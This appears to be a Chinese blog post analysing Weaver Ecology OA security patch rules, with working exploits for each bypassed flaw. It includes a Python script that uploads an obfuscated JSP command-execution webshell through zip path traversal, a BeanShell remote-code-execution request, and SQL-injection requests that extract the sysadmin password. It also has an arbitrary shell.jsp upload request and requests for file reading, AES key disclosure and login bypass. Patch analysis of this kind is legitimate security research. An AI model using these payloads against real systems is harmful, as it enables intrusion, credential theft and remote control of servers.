<h4 id="SecurityRuleQiyuesuoDownload-1"><a href="#SecurityRuleQiyuesuoDownload-1" class="headerlink" title="SecurityRuleQiyuesuoDownload"></a>SecurityRuleQiyuesuoDownload</h4><p>删减<code>ueditor/dialogs/link/link.html</code>路径<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215554352.png"></p>
<h4 id="SecurityRuleQX20"><a href="#SecurityRuleQX20" class="headerlink" title="SecurityRuleQX20"></a>SecurityRuleQX20</h4><p>对路径<code>/weaver/org.springframework.web.servlet.resourceservlet</code>、<code>/weaver/weaver.common.(ctrl|downloadservlet)</code>进行限制</p>
<h5 id="weaver-org-springframework-web-servlet-resourceservlet"><a href="#weaver-org-springframework-web-servlet-resourceservlet" class="headerlink" title="/weaver/org.springframework.web.servlet.resourceservlet"></a><code>/weaver/org.springframework.web.servlet.resourceservlet</code></h5><p><code>spring</code>路径为<code>ecology\WEB-INF\lib\spring-1.2.6.jar!\org\springframework\web\servlet\ResourceServlet.class</code><br>其中在方法<code>org.springframework.web.servlet.ResourceServlet#determineResourceUrl</code>中接收了<code>resource</code>参数并进行非空判断，不为空则包含<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215554647.png"></p>
<p>同<code>SecurityRuleImgTextViewFor23</code>，路径被限制在<code>ecology</code>下，但是能包含类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /weaver/org.springframework.web.servlet.ResourceServlet?resource=/log4j.properties HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://10.10.10.38/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaaZv8JsPLUYj5KcMzGky; JSESSIONID=aaaZv8JsPLUYj5KcMzGky; ecology_JSessionId=aaaZv8JsPLUYj5KcMzGky; __randcode__=aaaZv8JsPLUYj5KcMzGky; MJSESSIONID=abcGXMXsAvKVVfKakdkly</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215554965.png"></p>
<h5 id="weaver-weaver-common-ctrl-downloadservlet-【SecurityRuleQX21】"><a href="#weaver-weaver-common-ctrl-downloadservlet-【SecurityRuleQX21】" class="headerlink" title="/weaver/weaver.common.(ctrl|downloadservlet) 【SecurityRuleQX21】"></a><code>/weaver/weaver.common.(ctrl|downloadservlet)</code> 【SecurityRuleQX21】</h5><p>该规则为修复任意类调用<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215555214.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215555460.png"><br>可造成任意文件上传、下载，远程代码执行等风险<br>任意文件上传 POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import random</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generate_random_str(randomlength=16):</span><br><span class="line">  random_str = &#x27;&#x27;</span><br><span class="line">  base_str = &#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span><br><span class="line">  length = len(base_str) - 1</span><br><span class="line">  for i in range(randomlength):</span><br><span class="line">    random_str += base_str[random.randint(0, length)]</span><br><span class="line">  return random_str</span><br><span class="line"></span><br><span class="line">mm = generate_random_str(8)</span><br><span class="line"></span><br><span class="line">webshell_name1 = mm+&#x27;.jsp&#x27;</span><br><span class="line">webshell_name2 = &#x27;../../../&#x27;+webshell_name1</span><br><span class="line"></span><br><span class="line">def file_zip():</span><br><span class="line">    shell = &quot;&quot;&quot;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;sun.misc.BASE64Decoder&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    if(request.getParameter(&quot;cmd&quot;)!=null)&#123;</span><br><span class="line">        BASE64Decoder decoder = new BASE64Decoder();</span><br><span class="line">        Class rt = Class.forName(new String(decoder.decodeBuffer(&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;)));</span><br><span class="line">        Process e = (Process)</span><br><span class="line">                rt.getMethod(new String(decoder.decodeBuffer(&quot;ZXhlYw==&quot;)), String.class).invoke(rt.getMethod(new</span><br><span class="line">                        String(decoder.decodeBuffer(&quot;Z2V0UnVudGltZQ==&quot;))).invoke(null, new</span><br><span class="line">                        Object[]&#123;&#125;), request.getParameter(&quot;cmd&quot;) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">    &quot;&quot;&quot;   ## 替换shell内容</span><br><span class="line">    zf = zipfile.ZipFile(mm+&#x27;.zip&#x27;, mode=&#x27;w&#x27;, compression=zipfile.ZIP_DEFLATED)</span><br><span class="line">    zf.writestr(webshell_name2, shell)</span><br><span class="line"></span><br><span class="line">def GetShell(urllist):</span><br><span class="line">    file_zip()</span><br><span class="line">    print(&#x27;上传文件中&#x27;)</span><br><span class="line">    urls = urllist + &#x27;/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&amp;arg1=validateApp&#x27;</span><br><span class="line">    file = [(&#x27;file1&#x27;, (mm+&#x27;.zip&#x27;, open(mm + &#x27;.zip&#x27;, &#x27;rb&#x27;), &#x27;application/zip&#x27;))]</span><br><span class="line">    requests.post(url=urls,files=file,timeout=60, verify=False)</span><br><span class="line">    GetShellurl = urllist+&#x27;/cloudstore/&#x27;+webshell_name1</span><br><span class="line">    GetShelllist = requests.get(url = GetShellurl)</span><br><span class="line">    if GetShelllist.status_code == 200:</span><br><span class="line">        print(&#x27;利用成功webshell地址为:&#x27;+GetShellurl)</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;未找到webshell利用失败&#x27;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    if (len(sys.argv) == 2):</span><br><span class="line">        url = sys.argv[1]</span><br><span class="line">        GetShell(url)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;python3 lgo.py http://xx.xx.xx.xx&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h4 id="SecurityRuleQXLoadZip19"><a href="#SecurityRuleQXLoadZip19" class="headerlink" title="SecurityRuleQXLoadZip19"></a>SecurityRuleQXLoadZip19</h4><p>对结尾为<code>.do</code>的URI配置白名单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/uploadzip.do</span><br><span class="line">/backup.do</span><br><span class="line">/check.do</span><br><span class="line">/checkprocess.do</span><br><span class="line">/changebeanname.do</span><br><span class="line">/backprocess.do</span><br><span class="line">/remoteupgrade.do</span><br><span class="line">/writeprop.do</span><br><span class="line">/recoverfiles.do</span><br><span class="line">/upgradeready.do</span><br><span class="line">/processsql.do</span><br><span class="line">/getprocess.do</span><br><span class="line">/upgrade.do</span><br><span class="line">/skipall.do</span><br><span class="line">/downloadfile.do</span><br><span class="line">/coverfiles.do</span><br><span class="line">/writeLog.do</span><br><span class="line">/preparetorecover.do</span><br><span class="line">/verifybeforeforward.do</span><br><span class="line">/login.do</span><br><span class="line">/change.do</span><br></pre></td></tr></table></figure>
<p>非上述白名单则拦截<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215555766.png"></p>
<h3 id="Ecology-security-20190917-v10-15"><a href="#Ecology-security-20190917-v10-15" class="headerlink" title="Ecology_security_20190917_v10.15"></a>Ecology_security_20190917_v10.15</h3><h4 id="SecurityRuleForbiddenBshServlet"><a href="#SecurityRuleForbiddenBshServlet" class="headerlink" title="SecurityRuleForbiddenBshServlet"></a>SecurityRuleForbiddenBshServlet</h4><p>该规则阻挡了有名的<code>beanshell</code>远程代码执行漏洞<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215556056.png"><br>路径<code>/weaver/bsh.servlet.BshServlet</code>，涉及class<code>bsh/servlet/BshServlet.class</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /weaver/bsh.servlet.BshServlet HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">Content-Length: 70</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://10.10.10.38</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://10.10.10.38/weaver/bsh.servlet.BshServlet</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaaZv8JsPLUYj5KcMzGky; JSESSIONID=aaaZv8JsPLUYj5KcMzGky; ecology_JSessionId=aaaZv8JsPLUYj5KcMzGky; __randcode__=aaaZv8JsPLUYj5KcMzGky; MJSESSIONID=abcGXMXsAvKVVfKakdkly</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">bsh.script=%5Cu0065%5Cu0078%5Cu0065%5Cu0063%28%22whoami%22%29%3B%0D%0A</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215556294.png"></p>
<h4 id="SecurityRuleLogReader24"><a href="#SecurityRuleLogReader24" class="headerlink" title="SecurityRuleLogReader24"></a>SecurityRuleLogReader24</h4><p>可以读取日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.10.10.38/mobile/LogReader.jsp?lines=200</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215556605.png"></p>
<h4 id="SecurityRuleWFFunName25"><a href="#SecurityRuleWFFunName25" class="headerlink" title="SecurityRuleWFFunName25"></a>SecurityRuleWFFunName25</h4><p>看代码是一个任意sql语句执行 但是无法复现<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215556900.png"><br><code>workflow/exceldesign/exceluploadformula_db_ajax.jsp</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215557169.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215557583.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215557812.png"></p>
<h3 id="Ecology-security-20191010-v10-16"><a href="#Ecology-security-20191010-v10-16" class="headerlink" title="Ecology_security_20191010_v10.16"></a>Ecology_security_20191010_v10.16</h3><p>无更新，仅更改版本号</p>
<h3 id="Ecology-security-20191010-v10-18"><a href="#Ecology-security-20191010-v10-18" class="headerlink" title="Ecology_security_20191010_v10.18"></a>Ecology_security_20191010_v10.18</h3><p>将<code>admincenter/interfaces/</code>下的jsp文件全部置空为error<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215558065.png"><br>访问后发现为需要登录的页面</p>
<h4 id="SecurityRuleSQL28"><a href="#SecurityRuleSQL28" class="headerlink" title="SecurityRuleSQL28"></a>SecurityRuleSQL28</h4><p>补丁修复了位于<code>/mobile/workflowcentertreedata.jsp</code>的注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215558347.png"><br>读<code>sysadmin</code>密码POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/WorkflowCenterTreeData.jsp HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaaZv8JsPLUYj5KcMzGky; JSESSIONID=aaaZv8JsPLUYj5KcMzGky; ecology_JSessionId=aaaZv8JsPLUYj5KcMzGky; __randcode__=aaaZv8JsPLUYj5KcMzGky; MJSESSIONID=abcGXMXsAvKVVfKakdkly</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 110</span><br><span class="line"></span><br><span class="line">scope=1&amp;node=wftype_-1+union+select+1,(select+password+from+HrmResourceManager+where+id%3d1)+from+mobileconfig</span><br></pre></td></tr></table></figure>

<h3 id="Ecology-security-20191017-v10-19"><a href="#Ecology-security-20191017-v10-19" class="headerlink" title="Ecology_security_20191017_v10.19"></a>Ecology_security_20191017_v10.19</h3><h4 id="mobile-x2F-DBconfigReader-jsp"><a href="#mobile-x2F-DBconfigReader-jsp" class="headerlink" title="mobile&#x2F;DBconfigReader.jsp"></a>mobile&#x2F;DBconfigReader.jsp</h4><p>该补丁引入了数据库配置读取问题<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215558615.png"></p>
<h4 id="SecurityRule34"><a href="#SecurityRule34" class="headerlink" title="SecurityRule34"></a>SecurityRule34</h4><p> 修复了几个任意文件上传，其中一个POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /clusterupgrade/uploadFileClient.jsp HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.4.2</span><br><span class="line">Cookie: ecology_JSessionid=aaaJf7dLW4rqK8zTDfviy</span><br><span class="line">Content-Type: multipart/form-data; boundary=X-INSOMNIA-BOUNDARY</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 195</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">--X-INSOMNIA-BOUNDARY</span><br><span class="line">Content-Disposition: form-data; name=&quot;filename&quot;; filename=&quot;shell.jsp&quot;</span><br><span class="line">Content-Type: application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;% out.println(&quot;hello world!&quot;);%&gt;</span><br><span class="line">--X-INSOMNIA-BOUNDARY--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>传成功的状态码为200<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215558873.png"><br>传好后访问<code>http://10.10.10.38/filesystem4cluster/upload/shell.jsp</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215559187.png"></p>
<h4 id="SecurityRule35"><a href="#SecurityRule35" class="headerlink" title="SecurityRule35"></a>SecurityRule35</h4><p>修复了位于<code>/profiler/jstack.jsp</code>的跨目录写文件问题<br><code>jstack.jsp</code>在获取<code>cookie</code>并将<code>profilerCookie</code>的值用作文件路径时存在目录穿越问题，当cookie中存在类似<code>../</code>时会导致目录穿越，但是无法控制写入内容<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215559449.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215559707.png"></p>
<h4 id="SecurityRule36"><a href="#SecurityRule36" class="headerlink" title="SecurityRule36"></a>SecurityRule36</h4><p>该规则限制了<code>/templetecheck/</code>路径仅允许<code>sysadmin</code>访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215600036.png"></p>
<h4 id="SecurityRuleConfig38"><a href="#SecurityRuleConfig38" class="headerlink" title="SecurityRuleConfig38"></a>SecurityRuleConfig38</h4><p>该规则限制了<code>/dbconfigreader.jsp</code>、<code>/logreader.jsp</code>路径仅允许<code>sysadmin</code>访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215600461.png"></p>
<h4 id="SecurityRuleHttpServlet"><a href="#SecurityRuleHttpServlet" class="headerlink" title="SecurityRuleHttpServlet"></a>SecurityRuleHttpServlet</h4><p>对URI加强过滤处理</p>
<h4 id="SecurityRuleNetworkFor37"><a href="#SecurityRuleNetworkFor37" class="headerlink" title="SecurityRuleNetworkFor37"></a>SecurityRuleNetworkFor37</h4><p>对<code>/social/im/networkdisk.jsp</code>限制url参数访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215601735.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215602038.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /social/im/NetWorkDisk.jsp?url=/log4j.properties HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.4.2</span><br><span class="line">Cookie: ecology_JSessionid=aaaJf7dLW4rqK8zTDfviy</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215602282.png"></p>
<h4 id="SecurityRuleSQL28-1"><a href="#SecurityRuleSQL28-1" class="headerlink" title="SecurityRuleSQL28"></a>SecurityRuleSQL28</h4><p>修改原规则，去掉<code>mobile</code>路径限制改为全局拦截<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215602532.png"><br>全局搜了下发现还有以下目录存在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\WEAVER\ecology\mobile\browser\WorkflowCenterTreeData.jsp</span><br><span class="line">D:\WEAVER\ecology\mobile\plugin\browser\WorkflowCenterTreeData.jsp</span><br><span class="line">D:\WEAVER\ecology\system\sysremind\WorkflowCenterTreeData.jsp</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215602841.png"></p>
<h4 id="SecurityRuleSQL29"><a href="#SecurityRuleSQL29" class="headerlink" title="SecurityRuleSQL29"></a>SecurityRuleSQL29</h4><p>规则限制了对<code>/mobile/**/syncuserinfo.jsp</code>、<code>/cpt/manage/validate.jsp&quot;</code>的访问<br>读取sysadmin的POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=1)+union+select+id,loginid,password,lastname,1,mobile,1,status+from+hrmresourcemanager+where+id+in(1 HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.4.2</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215603082.png"></p>
<h4 id="SecurityRuleSQL30"><a href="#SecurityRuleSQL30" class="headerlink" title="SecurityRuleSQL30"></a>SecurityRuleSQL30</h4><p>规则限制了对<br><code>/mobile/**/htmlcalculate.jsp</code>、<code>/cpt/car/carsetdataoperation2.jsp</code>、<code>/mobile/getmaster.jsp</code>、<code>/mobile/changepassword.jsp</code>、<code>/mobile/hrm/</code>、<code>cloudstore/config(.xml|.properties)</code><br>的访问或进行鉴权</p>
<h5 id="x2F-mobile-x2F-plugin-x2F-1-x2F-html-x2F-htmlcalculate-jsp-SQL注入"><a href="#x2F-mobile-x2F-plugin-x2F-1-x2F-html-x2F-htmlcalculate-jsp-SQL注入" class="headerlink" title="&#x2F;mobile&#x2F;plugin&#x2F;1&#x2F;html&#x2F;htmlcalculate.jsp SQL注入"></a>&#x2F;mobile&#x2F;plugin&#x2F;1&#x2F;html&#x2F;htmlcalculate.jsp SQL注入</h5><p>参数formId<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215603374.png"></p>
<h5 id="x2F-cpt-x2F-car-x2F-carsetdataoperation2-jsp"><a href="#x2F-cpt-x2F-car-x2F-carsetdataoperation2-jsp" class="headerlink" title="&#x2F;cpt&#x2F;car&#x2F;carsetdataoperation2.jsp"></a>&#x2F;cpt&#x2F;car&#x2F;carsetdataoperation2.jsp</h5><p>参数<code>?action=checkdata&amp;carid=XX</code>，注入点<strong>carid</strong><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215603737.png"></p>
<h5 id="x2F-mobile-x2F-plugin-x2F-GetMaster-jsp"><a href="#x2F-mobile-x2F-plugin-x2F-GetMaster-jsp" class="headerlink" title="&#x2F;mobile&#x2F;plugin&#x2F;GetMaster.jsp"></a>&#x2F;mobile&#x2F;plugin&#x2F;GetMaster.jsp</h5><p>参数<code>userid</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215604058.png"></p>
<h5 id="x2F-mobile-x2F-plugin-x2F-hrm-x2F-changepassword-jsp"><a href="#x2F-mobile-x2F-plugin-x2F-hrm-x2F-changepassword-jsp" class="headerlink" title="&#x2F;mobile&#x2F;plugin&#x2F;hrm&#x2F;changepassword.jsp"></a>&#x2F;mobile&#x2F;plugin&#x2F;hrm&#x2F;changepassword.jsp</h5><p>增加鉴权</p>
<h5 id="x2F-mobile-x2F-hrm-x2F-、cloudstore-x2F-config-xml-properties"><a href="#x2F-mobile-x2F-hrm-x2F-、cloudstore-x2F-config-xml-properties" class="headerlink" title="&#x2F;mobile&#x2F;hrm&#x2F;、cloudstore&#x2F;config(.xml|.properties)"></a>&#x2F;mobile&#x2F;hrm&#x2F;、cloudstore&#x2F;config(.xml|.properties)</h5><p>增加鉴权操作</p>
<h3 id="Ecology-security-20191024-v10-20"><a href="#Ecology-security-20191024-v10-20" class="headerlink" title="Ecology_security_20191024_v10.20"></a>Ecology_security_20191024_v10.20</h3><h4 id="SecurityRuleMobile29"><a href="#SecurityRuleMobile29" class="headerlink" title="SecurityRuleMobile29"></a>SecurityRuleMobile29</h4><p>增加<code>mobile</code>目录访问权限控制xml</p>
<h3 id="Ecology-security-20191025-v10-21"><a href="#Ecology-security-20191025-v10-21" class="headerlink" title="Ecology_security_20191025_v10.21"></a>Ecology_security_20191025_v10.21</h3><h4 id="SecurityRule02"><a href="#SecurityRule02" class="headerlink" title="SecurityRule02"></a>SecurityRule02</h4><p>增加对<code>admin</code>目录校验<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215604345.png"></p>
<h4 id="SecurityRule39"><a href="#SecurityRule39" class="headerlink" title="SecurityRule39"></a>SecurityRule39</h4><p>修复了一个SQL注入导致的任意用户登录<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215604616.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/integration/simplesso/getToken HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.4.2</span><br><span class="line">Cookie: ecology_JSessionid=aaaJf7dLW4rqK8zTDfviy</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 38</span><br><span class="line"></span><br><span class="line">loginInfo=&#123;&quot;username&quot;:&quot;11&quot;,&quot;type&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="SecurityRuleForbiddenAES41"><a href="#SecurityRuleForbiddenAES41" class="headerlink" title="SecurityRuleForbiddenAES41"></a>SecurityRuleForbiddenAES41</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215604860.png"><br>该漏洞可获取weaver_security_aes key、偏移<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215605123.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /weaver/weaver.aes.GetAesInfo/.css HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.4.2</span><br><span class="line">Cookie: ecology_JSessionid=aaaJf7dLW4rqK8zTDfviy</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>封堵<code>file_manager_json.jsp</code>路径【很早之前就封过】</p>
<h4 id="SecurityRuleForbiddenMsg45"><a href="#SecurityRuleForbiddenMsg45" class="headerlink" title="SecurityRuleForbiddenMsg45"></a>SecurityRuleForbiddenMsg45</h4><p>封堵路径<code>/weaver/weaver.mgms.(WorkflowRequestServlet|SynchronizedOrganize)</code></p>
<p>2个XXE</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /weaver/weaver.mgms.WorkflowRequestServlet/.css HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.4.2</span><br><span class="line">Cookie: ecology_JSessionid=aaaJf7dLW4rqK8zTDfviy</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="SecurityRuleMess43"><a href="#SecurityRuleMess43" class="headerlink" title="SecurityRuleMess43"></a>SecurityRuleMess43</h4><p>规则限制了对<code>/weaver/weaver.messager.MessagerServlet</code>的访问，传入参数可获取用户信息,loginid、key参数可注入</p>
